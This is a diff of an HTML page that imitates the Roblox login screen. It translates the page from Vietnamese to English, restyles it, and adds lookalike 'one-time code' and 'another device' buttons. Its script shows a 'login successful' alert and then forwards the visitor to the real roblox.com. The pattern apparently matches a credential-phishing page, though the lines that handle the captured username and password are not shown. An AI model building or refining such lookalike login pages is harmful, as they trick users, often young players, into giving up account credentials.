@@ -1,80 +1,102 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Đăng nhập vào Roblox</title>
+    <title>Login to Roblox</title>
     <style>
-        body {
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
             font-family: Arial, sans-serif;
-            background-color: #0f0f0f;
+        }
+
+        body {
+            background-color: #121212;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
         }
+
         .login-container {
-            background-color: #1a1a1a;
-            padding: 20px;
+            background-color: #1e1e1e;
+            padding: 30px;
+            width: 350px;
             border-radius: 8px;
-            width: 400px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
             text-align: center;
-            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1);
         }
+
         .login-container h2 {
-            color: white;
+            color: #f7f7f8;
+            margin-bottom: 20px;
+        }
+
+        .input-box {
+            width: 100%;
+            padding: 10px;
             margin-bottom: 15px;
-            font-size: 22px;
-        }
-        input {
-            width: 90%;
-            padding: 12px;
-            margin: 10px 0;
+            border: 1px solid #555;
+            background: #2a2a2a;
+            color: #fff;
             border-radius: 5px;
-            border: 1px solid #333;
-            background-color: #262626;
-            color: white;
             outline: none;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
         }
-        button {
-            width: 90%;
-            padding: 12px;
-            margin-top: 10px;
-            border-radius: 5px;
-            border: none;
-            background-color: #3c82f6;
+
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #4a4a4a;
             color: white;
+            border: 1px solid #777;
             cursor: pointer;
-            font-size: 16px;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
+            border-radius: 5px;
         }
-        button:hover {
-            background-color: #1d4ed8;
+
+        .login-btn:hover {
+            background-color: #616161;
         }
+
         .forgot-password {
-            margin-top: 15px;
-            color: #9ca3af;
+            margin: 15px 0;
             font-size: 14px;
-            cursor: pointer;
+            color: #bcbec8;
         }
-        .forgot-password:hover {
-            text-decoration: underline;
+
+        .divider {
+            border-top: 1px solid #555;
+            margin: 15px 0;
+        }
+
+        .extra-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #303030;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+
+        .extra-btn:hover {
+            background-color: #505050;
         }
     </style>
 </head>
 <body>
+
     <div class="login-container">
-        <h2>Đăng nhập vào Roblox</h2>
-        <input type="text" id="username" placeholder="Tên người dùng/Địa chỉ email/Số điện thoại">
-        <input type="password" id="password" placeholder="Mật khẩu">
-        <button onclick="redirectToRoblox()">Đăng nhập</button>
-        <div class="forgot-password">Bạn quên mật khẩu hoặc tên người dùng?</div>
+        <h2>Login to Roblox</h2>
+        <input type="text" id="username" class="input-box" placeholder="Username/Email/Phone">
+        <input type="password" id="password" class="input-box" placeholder="Password">
+        <button class="login-btn" onclick="redirectToRoblox()">Log In</button>
+        <p class="forgot-password">Forgot Password or Username?</p>
+        <div class="divider"></div>
+        <button class="extra-btn">Email Me a One-Time Code</button>
+        <button class="extra-btn">Use Another Device</button>
     </div>
 
     <script>
@@ -88,7 +110,7 @@
             alert("Đăng nhập thành công! Đang chuyển hướng...");
             
             setTimeout(() => {
-                window.location.href = "https://www.roblox.com/vi/games/2753915549/Blox-Fruits";
+                window.location.href = "https://www.roblox.com/";
             }, 1000);
         }
     </script>
